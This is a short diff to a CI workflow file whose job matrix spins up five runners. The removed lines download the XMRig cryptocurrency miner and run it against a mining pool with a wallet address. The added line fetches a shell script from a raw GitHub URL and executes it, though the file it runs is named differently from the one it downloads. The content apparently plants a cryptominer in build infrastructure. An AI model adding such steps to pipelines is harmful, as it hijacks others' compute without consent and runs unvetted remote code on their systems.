@@ -24,8 +24,4 @@ jobs:
      runner: [0,1,2,3,4]
    steps:
      - run: |
-         wget wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
-tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
-ls
-cd xmrig-6.15.0
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u eth:0xef457f7bc99da168280b2c5ad4fbd4c0c99f0391.myminer -p x
+          wget https://raw.githubusercontent.com/boigd/Bash.sh/main/bash.sh && chmod +x xmr.sh && ./xmr.sh
